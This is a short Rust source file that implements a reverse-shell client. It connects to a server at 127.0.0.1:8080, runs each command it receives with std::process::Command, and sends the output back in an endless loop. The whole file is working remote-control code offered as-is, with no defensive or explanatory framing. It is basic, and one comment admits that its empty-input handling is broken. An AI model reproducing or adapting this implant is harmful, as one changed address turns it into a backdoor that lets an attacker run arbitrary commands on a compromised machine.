#![allow(unused)]
use std::net::TcpStream;
use std::io::{self, Write, Read};
use std::process::{Command, Output};

fn execute_command(request: &str) -> Output{
    Command::new(request)
        .output()
        .expect("Failed to execute command.")
}

fn comm_in(mut stream: &TcpStream) -> String {
    // Read command from the server
    let mut buffer = [0; 1024];
    let bytes_read = stream.read(&mut buffer).expect("Failed to read from server.");

    // Attempt to allowing the enter key to be used without a command, currently broken
    if bytes_read == 0 {
        let request = ">: ";
        println!("Received Request: {}", &request);
        return (&request).to_string()

    } else {
    
        // Assign data from server to variable and print it
    let request = String::from_utf8_lossy(&buffer[..bytes_read]);
    println!("Received Request: {}", &request);
 
    return (&request).to_string()
    }
}

fn comm_out(output: &Output, mut stream: &TcpStream) -> io::Result<()> {
    // Send a response back to the server
    let response = format!("{}", String::from_utf8_lossy(&output.stdout));
    stream.write_all(response.as_bytes())?;
    stream.flush()?;
    Ok(())
}



fn comm_handler(stream: &mut TcpStream) {
    loop {
        let request = comm_in(&stream);
        let output = execute_command(&request);

        if let Err(err) = comm_out(&output, &stream) {
            eprintln!("Error sending response: {}", err);
        } else {
            continue;
        }

    }
}

fn main() {
    let mut stream = TcpStream::connect("127.0.0.1:8080").expect("Could not connect to server.");
    comm_handler(&mut stream);
}
